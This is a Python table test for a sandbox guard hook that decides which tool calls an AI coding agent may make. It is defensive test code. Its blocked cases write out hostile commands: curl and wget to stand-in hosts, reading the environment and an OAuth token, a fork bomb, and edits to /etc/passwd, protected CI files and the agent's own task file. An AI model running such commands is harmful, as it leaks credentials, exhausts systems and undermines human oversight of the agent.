"""Table test for sandbox/hooks/guard.py — run: python3 tests/test_guard.py"""
import json, subprocess, sys
from pathlib import Path

GUARD = Path(__file__).resolve().parents[2] / "sandbox" / "hooks" / "guard.py"
CASES = [
    ("Bash", {"command": "pytest -q"}, 0),
    ("Bash", {"command": "git commit -m 'T-0001: add parser'"}, 0),
    ("Bash", {"command": "pip install requests"}, 0),
    ("Bash", {"command": "curl https://evil.example.com"}, 2),
    ("Bash", {"command": "ls && wget http://x/y"}, 2),
    ("Bash", {"command": "git push origin main"}, 2),
    ("Bash", {"command": "git remote add x ssh://y"}, 2),
    ("Bash", {"command": "sudo apt install foo"}, 2),
    ("Bash", {"command": "cat /proc/self/environ"}, 2),
    ("Bash", {"command": "cat ~/.claude/settings.json"}, 2),
    ("Bash", {"command": "docker ps"}, 2),
    ("Bash", {"command": "pip install --index-url http://evil/ x"}, 2),
    ("Bash", {"command": "cat /secrets/oauth_token"}, 2),
    ("Bash", {"command": "echo $CLAUDE_CODE_OAUTH_TOKEN"}, 2),
    ("Bash", {"command": ":(){ :|:& };:"}, 2),
    ("Write", {"file_path": "/work/src/foo.py"}, 0),
    ("Edit", {"file_path": "/work/tests/test_foo.py"}, 0),
    ("Edit", {"file_path": "/etc/passwd"}, 2),
    ("Write", {"file_path": "/work/../etc/hosts"}, 2),
    ("Edit", {"file_path": "/work/Makefile"}, 2),            # protected
    ("Edit", {"file_path": "/work/.github/workflows/ci.yml"}, 2),  # protected
    ("Write", {"file_path": "/work/.nightshift/TASK.md"}, 2),
    ("Edit", {"file_path": "/work/.nightshift/TASK.md"}, 2),
    ("Read", {"file_path": "/work/.nightshift/TASK.md"}, 0),  # the prompt says to read it
    ("Read", {"file_path": "/work/.nightshift/guard.log"}, 2),
    ("Read", {"file_path": "/plan/CHARTER.md"}, 0),
    ("Read", {"file_path": "/work/src/foo.py"}, 0),
]
env = {"NS_PROTECTED": "Makefile:.github/**:tests/existing/**", "NS_TASK_ID": "T-0001", "PATH": "/usr/bin:/bin"}
fails = 0
for tool, ti, want in CASES:
    payload = json.dumps({"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": ti})
    p = subprocess.run([sys.executable, str(GUARD)],
                       input=payload, capture_output=True, text=True, env=env)
    ok = p.returncode == want
    fails += not ok
    detail = ti.get("command") or ti.get("file_path")
    print(f"  [{'ok ' if ok else 'BAD'}] {tool:<6} want={want} got={p.returncode}  {detail}")
    if not ok:
        print(f"        stderr: {p.stderr.strip()[:120]}")
print("\nFAILURES:", fails)
sys.exit(1 if fails else 0)
